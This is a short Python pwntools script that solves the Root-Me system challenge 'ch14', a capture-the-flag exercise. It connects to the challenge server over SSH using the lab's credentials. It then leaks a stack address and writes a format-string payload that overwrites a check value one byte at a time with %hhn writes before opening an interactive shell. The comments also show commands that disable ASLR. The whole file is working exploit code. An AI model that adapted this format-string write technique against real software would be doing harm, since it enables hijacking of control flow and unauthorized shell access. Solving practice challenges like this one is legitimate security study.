from pwn import *

# Disable ASLR for OS
# echo 0 >> /proc/sys/kernel/randomize_va_space
# sysctl -w kernel.randomize_va_space=0

# Initialize
ssh = ssh("app-systeme-ch14", "challenge02.root-me.org", 2222, "app-systeme-ch14")

log.info("Calculate checkAddress")
proc = ssh.process(["./ch14", "A"*60])
proc.recvuntil(b"check at 0x")
checkAddress = int(proc.recvuntil(b"\n")[:-1], 16)
proc.close()
log.success(f"{hex(checkAddress) = }")

log.info("Generate payload")
payload  = p32(checkAddress)   # ef, 9th
payload += p32(checkAddress+1) # be, 10th
payload += p32(checkAddress+2) # ad, 11th
payload += p32(checkAddress+3) # de, 12th
payload += b"%" + str(0xad - len(payload)).encode() + b"c"
payload += b"%11$hhn"
payload += b"%" + str(0xbe - 0xad).encode() + b"c"
payload += b"%10$hhn"
payload += b"%" + str(0xde - 0xbe).encode() + b"c"
payload += b"%12$hhn"
payload += b"%" + str(0xef - 0xde).encode() + b"c"
payload += b"%9$hhn"
log.info(str(payload))

# Exploit
proc = ssh.process(["./ch14", payload])
proc.interactive()
